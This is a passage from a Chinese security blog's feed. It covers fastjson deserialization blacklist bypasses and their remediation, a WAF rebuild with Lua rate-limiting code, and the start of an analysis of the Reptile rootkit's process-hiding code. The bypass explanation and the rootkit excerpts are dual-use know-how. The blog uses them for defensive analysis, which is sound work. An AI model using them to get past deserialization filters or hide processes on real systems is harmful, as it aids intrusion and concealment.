class=\"n\">deserializer</span> <span class=\"o\">=</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">getDeserializer</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">);</span>    <span class=\"k\">return</span> <span class=\"n\">deserializer</span><span class=\"o\">.</span><span class=\"na\">deserialze</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">clazz</span><span class=\"o\">,</span> <span class=\"n\">fieldName</span><span class=\"o\">);</span><span class=\"o\">}</span></code></pre></div></div><p>一个分界点就是在 loadClass 这个部分，后续会在类加载这部分做文章，后续利用和类加载先不在这儿讨论（RMI/LDAP…）</p><h4 id=\"1247\">1.2.47</h4><p>后续，出现了对这种任意类加载的检查机制，同样在类加载的时候，多了一个 checkAutoType</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">object</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span>        <span class=\"o\">&amp;&amp;</span> <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">().</span><span class=\"na\">getName</span><span class=\"o\">().</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">))</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">();</span><span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">checkAutoType</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">getFeatures</span><span class=\"o\">());</span><span class=\"o\">}</span><span class=\"c1\">// 引入了对应的黑名单机制，顺便还给加了一下密</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">getClassFromMapping</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">);</span><span class=\"c1\">//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null</span><span class=\"o\">}</span><span class=\"c1\">// 这里给入 java.lang.class</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">deserializers</span><span class=\"o\">.</span><span class=\"na\">findClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">);</span><span class=\"c1\">// 将typeName作为key从deserializers(IdentityHashMap)中查找对象</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">expectClass</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span>            <span class=\"o\">&amp;&amp;</span> <span class=\"n\">clazz</span> <span class=\"o\">!=</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">HashMap</span><span class=\"o\">.</span><span class=\"na\">class</span>            <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">isAssignableFrom</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">))</span> <span class=\"o\">{</span>        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"type not match. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span> <span class=\"o\">+</span> <span class=\"s\">\" -&gt; \"</span> <span class=\"o\">+</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>    <span class=\"o\">}</span>    <span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"n\">autoTypeSupport</span><span class=\"o\">)</span> <span class=\"o\">{</span><span class=\"c1\">//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤</span>    <span class=\"kt\">long</span> <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">h3</span><span class=\"o\">;</span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">3</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">className</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"o\">++</span><span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">className</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>        <span class=\"n\">hash</span> <span class=\"o\">^=</span> <span class=\"n\">c</span><span class=\"o\">;</span>        <span class=\"n\">hash</span> <span class=\"o\">*=</span> <span class=\"no\">PRIME</span><span class=\"o\">;</span>        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"nc\">Arrays</span><span class=\"o\">.</span><span class=\"na\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">denyHashCodes</span><span class=\"o\">,</span> <span class=\"n\">hash</span><span class=\"o\">)</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"autoType is not support. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span><span class=\"o\">);</span>        <span class=\"o\">}</span>        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"nc\">Arrays</span><span class=\"o\">.</span><span class=\"na\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">acceptHashCodes</span><span class=\"o\">,</span> <span class=\"n\">hash</span><span class=\"o\">)</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">defaultClassLoader</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>            <span class=\"o\">}</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">expectClass</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">isAssignableFrom</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">))</span> <span class=\"o\">{</span>                <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"type not match. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span> <span class=\"o\">+</span> <span class=\"s\">\" -&gt; \"</span> <span class=\"o\">+</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>            <span class=\"o\">}</span>            <span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">defaultClassLoader</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span><span class=\"o\">}</span><span class=\"c1\">//省略部分代码</span><span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span></code></pre></div></div><p>其实跟之前不一样，需要有两个键值对的方式，就是因为要使用 mapping 缓存机制，在第一次循环的时候把恶意这个类给加载到缓存，在第二次运行到 <code class=\"language-plaintext highlighter-rouge\">getClassFromMapping</code> 的时候，就直接返回了，绕过了下面的黑名单检查（虽然黑名单检查本身就不对…）</p><h4 id=\"1268\">1.2.68</h4><p>持续最长的一个问题，当然除了 1.2.83 的 Throwable 不算。黑名单的绕过机制，基于 java.lang.AutoCloseable…</p><h3 id=\"修复\">修复</h3><blockquote>  <p>修复是一个大问题，有时候并不是想的那么简单…</p></blockquote><p>因为公司内部有标准的发布系统，根据发布卡点 + 内部排查，版本限制并不是一个大问题，当然也有例外</p><h4 id=\"大数据系统\">大数据系统</h4><blockquote>  <p>大数据有很多自编写的 UDF，在/离线任务，这些不经过发布系统。还有一些很老的边缘系统，通过 Nginx 直接转发到后端应用，通过梳理 nginx config，统一排查</p></blockquote><p>根据 google/log4jscanner 魔改了一下，做了一个 jar 包的扫描，排除了一下历史上的问题。这个很通用，我们把历史的一些（包括 log4j）的都添加到规则内，对上传的 jar 包做检查</p><h4 id=\"safemode\">safemode</h4><p>理论上升级到 68 以上，基本没有危害（Throwable 的 83也有问题，不过也有一定条件，还行）。但是，由于 inet4 还是会出网，有段时间收到 CERT 的一个整改，就是因为有人扫 inet 收到 DNS 请求，说有 fastjson 漏洞了，需要整改…其实在线上 DNS 告警中，我们看到了这个，当时不认为有利用价值，CERT 认为有，所以一咬牙我们开始推行 safemode，整个过程中还是会有个别问题… TODO</p><h2 id=\"黑白盒检测\">黑白盒检测</h2>",
            "url": "https://chriskalix.github.io/2022/09/13/java-security",
            
            
            
            
            
            "date_published": "2022-09-13T00:00:00+02:00",
            "date_modified": "2022-09-13T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/08/21/waf-dev",
            "title": "WAF 开发实战",
            "summary": "WAF 开发实战",
            "content_text": "背景爬虫越来越多，峰值流量越来越高，非标应用难以维护等，对于 WAF 产生了挑战。通过 WAF 重构，减轻历史负担，承担更多安全场景需求  性能上提升  能够更好地处理大流量场景  更加合理标准化的架构方案  函数级别的灰度控制能力设计本身谈不上大的改动或者设计，因为 WAF 升级过程中需要同时兼容两个版本，没有做很大变更，大致如下。原先 WAF 大致如下实际遇到的问题Redis  Redis 负责规则/开关的存储，由 WAF-admin 控制同步Nginx-Lua 部分需要和 Redis/WAF-admin 通讯（storm 为 filebeat 同步计算）。而问题则是 Redis 因为历史原因通过 IP 连接单库，虽然有从库，仍然有风险造成类似单点故障的问题。Storm  Storm 为计频，满足实时计算的封禁需求为组内早先自己搭建，完全由自己维护。目前公司内部不再使用 storm 集群，即自维护的集群如果出现了主节点 down 等问题，一时间也无法完全恢复，同样容易造成单点故障问题WAF-admin  WAF-admin 是主控端，负责 Nginx-Lua 控制，数据对接处理等完全由 Python 编写，代码中有许多 Hardcode 的地方，无法 CI/CD 走标准发布。在特殊情况没法及时扩容等Others一些分布在机器上的定时任务，脚本，用于 WAF 的分析等，没有良好的备份/标准文档等改动  图中的 Redis 被移除，WAF-admin 重构为 Java（标准化，可以 CI/CD），Mysql 不再自己维护，Storm 全部重写为 Flink 并且满足新的需求具体细节  WAF 开发的具体笔记，仅记录重要部分Nginx-Lua  公司的 WAF 直接以 Lua 的形式部署在 LB 之后的 Nginx 集群。通过伪代码的形式展示存在的问题和修复错误的函数使用入职接手之后，碰到过一个线上的问题。有一个接口，单独使用 ip + url 的形式无法封禁。经过排查，是一个很小的点。在 Nginx 中，某个 Server 配置如下server {    ...    server_name xxx.test.com xxx1.test.com;    ...}而当时封禁函数使用的地址获取方式为ngx.var.server_name .. ngx.var.uri其中 ngx.var.server_name 默认获取 server_name 的第一个，早在 2015 年就有人提过这个问题。ngx.var.server_name 本身使用目的不是如此，而应该使用内置的 ngx.var.host 来获取重复的字符操作  在老版本的 Lua 中，经常能看到一些字符串的重复操作。常见的是：从 nginx 共享内存中读取规则，并且解析。伪代码如下function demo_check()    local config = rules:get(\"demo\")    for _, d in pairs(split(config), \"!!!\") do    ...这样的代码几乎出现在每个函数中，穿插在对应的 access 流程里。假设我们有 10 个 check 函数，那么每次请求我们都需要做 10 次无效的字符串 split 操作。在后续的对比里，这段 split 所占的大约为 15 ～ 20%如何解决这个问题? 很尴尬的是，这个 WAF 代码原先并无引入 worker，没有缓存的功能。大致为，在 nginx 的 init_worker 阶段引入 worker 文件，做秒级的规则 pull 和解析。代码也很简单，写好函数，定时调用即可Segfault  当我开心的写完，引入这个文件之后，我们发现在一些测试机器上会出现 segment fault 的问题，我们 dump 下这个文件，稍微看了一下。gdb &lt;nginx&gt; core&gt; (gdb) bt`text`#0 ... in ngx_http_core_create_srv_conf()#1 ... in ngx_http_lua_init_worker()#2 ... in ngx_worker_process_init()...大致可以看出跟我们引入的 init_worker 文件相关，函数定位在 ngx_http_core_create_srv_conf。通过查询，我们看到有一个类似 issue。大致原因为：当 nginx 版本 &gt;= 1.15.0 且 lua-nginx-module 组件 &lt;= 0.10.14 时会出现这个问题。这种往往是在后期测试时发现，能搜到的只有官方的特殊 issue。同时对于 WAF 这种影响面很大的，上线发布等要有合理的测试、灰度等发现这类比较隐蔽的问题多次字符拼接在原先 Log 日志打印部分，能看到类似以下代码local log = clientip .. \" [\" .. time .. \" ]\" .. method .. \" \" .. ngx_method .. \" \" ......有类似超 9 个字符串连续拼接的场景。在 Lua 中每次 .. 拼接意味着开辟新空间，产生拷贝。这种多次拼接的长字符串拼接，对性能会有较大的影响，会有频繁 GC 的风险。在新 WAF 中改为通过 table concat 的方式做拼接。concat 函数本身不会有频繁申请拷贝的操作，而是当写满一个定长的 BUFFER 之后，才会生成一个 TString 做一次内存合并。在其他的一些简单场景，如单次使用 .. 进行拼接，则无需做修改。多维度限流  之前的限流完全依赖两个，一个是实时处理（Storm 根据日志计频），但是往往会有小的延时（例如 10 秒）；另一个就是单机器上的 URL 限流（兜底）。我们需要一个更为灵活的多维度限流调研之后，我们需要一种支持任意 Header 字段，Cookie 字段的限流，来满足一些活动场景下，大流量代拍、恶意刷取的场景。限流部分可以使用 lua-resty-limit-traffic，这种使用类似于匀速器，即如果设定 1 秒内限定 rate 100，则任意的 0.1 秒都是均匀的。由于引入组件还需要做稳定性测试，延长了整个项目的周期，所以决定直接用共享内存实现伪代码如下:function advanced_cc_check(context)    ...    if advanced_cc_check == \"on\" then        cache:flush_expired()        local rule = get_rule(\"advanced_cc\" .. context.uri)        for field, value in pairs(rule) do            if field == \"ip\" then                local key = \"advanced_cc\" .. context.uriip                local count = cache:get(key)                local counter = 0;                if count then                    counter = cache:incr(key, 1)                else                    cache:set(key, 1, 1)                    counter = 1                end                if counter &gt; value then                    ngx.exit(xxx)                    log...                ...            elseif field == \"cookie\" then                ...            elseif field == \"header\" then                ...            elseif field == \"arg\" then                ...其余限流部分可以自己实现，和 IP 部分代码类似其余其余则为灰度，版本控制，规则更新等Flink  待更新…",
            "content_html": "<h2 id=\"背景\">背景</h2><p>爬虫越来越多，峰值流量越来越高，非标应用难以维护等，对于 WAF 产生了挑战。通过 WAF 重构，减轻历史负担，承担更多安全场景</p><h2 id=\"需求\">需求</h2><ul>  <li>性能上提升</li>  <li>能够更好地处理大流量场景</li>  <li>更加合理标准化的架构方案</li>  <li>函数级别的灰度控制能力</li></ul><h2 id=\"设计\">设计</h2><p>本身谈不上大的改动或者设计，因为 WAF 升级过程中需要同时兼容两个版本，没有做很大变更，大致如下。原先 WAF 大致如下</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/waf-old.png\" alt=\"WAF-OLD\" /></p><h3 id=\"实际遇到的问题\">实际遇到的问题</h3><p><strong>Redis</strong></p><blockquote>  <p>Redis 负责规则/开关的存储，由 WAF-admin 控制同步</p></blockquote><p>Nginx-Lua 部分需要和 Redis/WAF-admin 通讯（storm 为 filebeat 同步计算）。而问题则是 Redis 因为历史原因通过 IP 连接单库，虽然有从库，仍然有风险造成类似单点故障的问题。</p><p><strong>Storm</strong></p><blockquote>  <p>Storm 为计频，满足实时计算的封禁需求</p></blockquote><p>为组内早先自己搭建，完全由自己维护。目前公司内部不再使用 storm 集群，即自维护的集群如果出现了主节点 down 等问题，一时间也无法完全恢复，同样容易造成单点故障问题</p><p><strong>WAF-admin</strong></p><blockquote>  <p>WAF-admin 是主控端，负责 Nginx-Lua 控制，数据对接处理等</p></blockquote><p>完全由 Python 编写，代码中有许多 Hardcode 的地方，无法 CI/CD 走标准发布。在特殊情况没法及时扩容等</p><p><strong>Others</strong></p><p>一些分布在机器上的定时任务，脚本，用于 WAF 的分析等，没有良好的备份/标准文档等</p><h3 id=\"改动\">改动</h3><blockquote>  <p>图中的 Redis 被移除，WAF-admin 重构为 Java（标准化，可以 CI/CD），Mysql 不再自己维护，Storm 全部重写为 Flink 并且满足新的需求</p></blockquote><p><img src=\"https://chriskaliX.github.io/assets/imgs/waf-new.png\" alt=\"WAF-NEW\" /></p><h2 id=\"具体细节\">具体细节</h2><blockquote>  <p>WAF 开发的具体笔记，仅记录重要部分</p></blockquote><h3 id=\"nginx-lua\">Nginx-Lua</h3><blockquote>  <p>公司的 WAF 直接以 Lua 的形式部署在 LB 之后的 Nginx 集群。通过伪代码的形式展示存在的问题和修复</p></blockquote><h4 id=\"错误的函数使用\">错误的函数使用</h4><p>入职接手之后，碰到过一个线上的问题。有一个接口，单独使用 ip + url 的形式无法封禁。经过排查，是一个很小的点。在 Nginx 中，某个 Server 配置如下</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>server {    ...    server_name xxx.test.com xxx1.test.com;    ...}</code></pre></div></div><p>而当时封禁函数使用的地址获取方式为</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ngx.var.server_name .. ngx.var.uri</code></pre></div></div><p>其中 <code class=\"language-plaintext highlighter-rouge\">ngx.var.server_name</code> 默认获取 server_name 的第一个，早在 2015 年就有人提过这个<a href=\"https://github.com/openresty/openresty/issues/98\">问题</a>。<code class=\"language-plaintext highlighter-rouge\">ngx.var.server_name</code> 本身使用目的不是如此，而应该使用内置的 <code class=\"language-plaintext highlighter-rouge\">ngx.var.host</code> 来获取</p><h4 id=\"重复的字符操作\">重复的字符操作</h4><blockquote>  <p>在老版本的 Lua 中，经常能看到一些字符串的重复操作。常见的是：从 nginx 共享内存中读取规则，并且解析。伪代码如下</p></blockquote><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"nf\">demo_check</span><span class=\"p\">()</span>    <span class=\"kd\">local</span> <span class=\"n\">config</span> <span class=\"o\">=</span> <span class=\"n\">rules</span><span class=\"p\">:</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"s2\">\"demo\"</span><span class=\"p\">)</span>    <span class=\"k\">for</span> <span class=\"n\">_</span><span class=\"p\">,</span> <span class=\"n\">d</span> <span class=\"k\">in</span> <span class=\"nb\">pairs</span><span class=\"p\">(</span><span class=\"n\">split</span><span class=\"p\">(</span><span class=\"n\">config</span><span class=\"p\">),</span> <span class=\"s2\">\"!!!\"</span><span class=\"p\">)</span> <span class=\"k\">do</span>    <span class=\"o\">...</span></code></pre></div></div><p>这样的代码几乎出现在每个函数中，穿插在对应的 access 流程里。假设我们有 10 个 check 函数，那么每次请求我们都需要做 10 次无效的字符串 split 操作。在后续的对比里，这段 split 所占的大约为 15 ～ 20%</p><p>如何解决这个问题? 很尴尬的是，这个 WAF 代码原先并无引入 worker，没有缓存的功能。大致为，在 nginx 的 init_worker 阶段引入 worker 文件，做秒级的规则 pull 和解析。代码也很简单，写好函数，定时调用即可</p><p><strong>Segfault</strong></p><blockquote>  <p>当我开心的写完，引入这个文件之后，我们发现在一些测试机器上会出现 segment fault 的问题，我们 dump 下这个文件，稍微看了一下。</p></blockquote><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>gdb &lt;nginx&gt; core&gt; (gdb) bt`text`#0 ... in ngx_http_core_create_srv_conf()#1 ... in ngx_http_lua_init_worker()#2 ... in ngx_worker_process_init()...</code></pre></div></div><p>大致可以看出跟我们引入的 init_worker 文件相关，函数定位在 <code class=\"language-plaintext highlighter-rouge\">ngx_http_core_create_srv_conf</code>。通过查询，我们看到有一个类似 <a href=\"https://github.com/openresty/lua-nginx-module/issues/1348\">issue</a>。大致原因为：当 nginx 版本 &gt;= 1.15.0 且 lua-nginx-module 组件 &lt;= 0.10.14 时会出现这个问题。</p><p>这种往往是在后期测试时发现，能搜到的只有官方的特殊 issue。同时对于 WAF 这种影响面很大的，上线发布等要有合理的测试、灰度等发现这类比较隐蔽的问题</p><p><strong>多次字符拼接</strong></p><p>在原先 Log 日志打印部分，能看到类似以下代码</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">local</span> <span class=\"n\">log</span> <span class=\"o\">=</span> <span class=\"n\">clientip</span> <span class=\"o\">..</span> <span class=\"s2\">\" [\"</span> <span class=\"o\">..</span> <span class=\"n\">time</span> <span class=\"o\">..</span> <span class=\"s2\">\" ]\"</span> <span class=\"o\">..</span> <span class=\"n\">method</span> <span class=\"o\">..</span> <span class=\"s2\">\" \"</span> <span class=\"o\">..</span> <span class=\"n\">ngx_method</span> <span class=\"o\">..</span> <span class=\"s2\">\" \"</span> <span class=\"o\">......</span></code></pre></div></div><p>有类似超 9 个字符串连续拼接的场景。在 Lua 中每次 .. 拼接意味着开辟新空间，产生拷贝。这种多次拼接的长字符串拼接，对性能会有较大的影响，会有频繁 GC 的风险。在新 WAF 中改为通过 table concat 的方式做拼接。</p><p>concat 函数本身不会有频繁申请拷贝的操作，而是当写满一个定长的 BUFFER 之后，才会生成一个 TString 做一次内存合并。在其他的一些简单场景，如单次使用 .. 进行拼接，则无需做修改。</p><p><strong>多维度限流</strong></p><blockquote>  <p>之前的限流完全依赖两个，一个是实时处理（Storm 根据日志计频），但是往往会有小的延时（例如 10 秒）；另一个就是单机器上的 URL 限流（兜底）。我们需要一个更为灵活的多维度限流</p></blockquote><p>调研之后，我们需要一种支持任意 Header 字段，Cookie 字段的限流，来满足一些活动场景下，大流量代拍、恶意刷取的场景。限流部分可以使用 lua-resty-limit-traffic，这种使用类似于匀速器，即如果设定 1 秒内限定 rate 100，则任意的 0.1 秒都是均匀的。由于引入组件还需要做稳定性测试，延长了整个项目的周期，所以决定直接用共享内存实现</p><p>伪代码如下:</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"nf\">advanced_cc_check</span><span class=\"p\">(</span><span class=\"n\">context</span><span class=\"p\">)</span>    <span class=\"o\">...</span>    <span class=\"k\">if</span> <span class=\"n\">advanced_cc_check</span> <span class=\"o\">==</span> <span class=\"s2\">\"on\"</span> <span class=\"k\">then</span>        <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">flush_expired</span><span class=\"p\">()</span>        <span class=\"kd\">local</span> <span class=\"n\">rule</span> <span class=\"o\">=</span> <span class=\"n\">get_rule</span><span class=\"p\">(</span><span class=\"s2\">\"advanced_cc\"</span> <span class=\"o\">..</span> <span class=\"n\">context</span><span class=\"p\">.</span><span class=\"n\">uri</span><span class=\"p\">)</span>        <span class=\"k\">for</span> <span class=\"n\">field</span><span class=\"p\">,</span> <span class=\"n\">value</span> <span class=\"k\">in</span> <span class=\"nb\">pairs</span><span class=\"p\">(</span><span class=\"n\">rule</span><span class=\"p\">)</span> <span class=\"k\">do</span>            <span class=\"k\">if</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"ip\"</span> <span class=\"k\">then</span>                <span class=\"kd\">local</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"s2\">\"advanced_cc\"</span> <span class=\"o\">..</span> <span class=\"n\">context</span><span class=\"p\">.</span><span class=\"n\">uriip</span>                <span class=\"kd\">local</span> <span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>                <span class=\"kd\">local</span> <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>                <span class=\"k\">if</span> <span class=\"n\">count</span> <span class=\"k\">then</span>                    <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">incr</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span>                <span class=\"k\">else</span>                    <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">set</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span>                    <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"mi\">1</span>                <span class=\"k\">end</span>                <span class=\"k\">if</span> <span class=\"n\">counter</span> <span class=\"o\">&gt;</span> <span class=\"n\">value</span> <span class=\"k\">then</span>                    <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"n\">xxx</span><span class=\"p\">)</span>                    <span class=\"n\">log</span><span class=\"o\">...</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"cookie\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"header\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"arg\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span></code></pre></div></div><p>其余限流部分可以自己实现，和 IP 部分代码类似</p><p><strong>其余</strong></p><p>其余则为灰度，版本控制，规则更新等</p><h3 id=\"flink\">Flink</h3><blockquote>  <p>待更新…</p></blockquote>",
            "url": "https://chriskalix.github.io/2022/08/21/waf-dev",
            
            
            
            
            
            "date_published": "2022-08-21T00:00:00+02:00",
            "date_modified": "2022-08-21T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/05/18/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%89-rootkit%E9%9A%90%E8%97%8F",
            "title": "Linux Rootkit初窥(三)Rootkit隐藏",
            "summary": "Linux Rootkit初窥(三)Rootkit隐藏",
            "content_text": "背景一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要以下部分代码基于 Reptileproc 隐藏代码地址判断可见首先是入口地址，判断进程是否可见，再调用 flag_tasks 设置void hide_proc(pid_t pid){\tif (is_proc_invisible(pid))\t\tflag_tasks(pid, 0);\telse\t\tflag_tasks(pid, 1);}先看一下 is_proc_invisible 函数int is_proc_invisible(pid_t pid){\tstruct task_struct *task;\tint ret = 0;\tif (!pid)\t\treturn ret;\ttask = find_task(pid);\tif (!task)\t\treturn ret;\tif (is_task_invisible(task))\t\tret = 1;\tput_task_struct(task);\treturn ret;}...#define FLAG 0x80000000static inline int is_task_invisible(struct task_struct *task){\treturn task-&gt;flags &amp; FLAG;}主要判断 task-&gt;flags 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：进程标记task_struct 这个结构体，在 linux/sched.h 下，elixir对应的 flags 标识位如下所示:/* * Per process flags */#define PF_VCPU\t\t\t0x00000001\t/* I'm a virtual CPU */#define PF_IDLE\t\t\t0x00000002\t/* I am an IDLE thread */#define PF_EXITING\t\t0x00000004\t/* Getting shut down */#define PF_POSTCOREDUMP\t\t0x00000008\t/* Coredumps should ignore this task */#define PF_IO_WORKER\t\t0x00000010\t/* Task is an IO worker */#define PF_WQ_WORKER\t\t0x00000020\t/* I'm a workqueue worker */#define PF_FORKNOEXEC\t\t0x00000040\t/* Forked but didn't exec */#define PF_MCE_PROCESS\t\t0x00000080      /* Process policy on mce errors */#define PF_SUPERPRIV\t\t0x00000100\t/* Used super-user privileges */#define PF_DUMPCORE\t\t0x00000200\t/* Dumped core */#define PF_SIGNALED\t\t0x00000400\t/* Killed by a signal */#define PF_MEMALLOC\t\t0x00000800\t/* 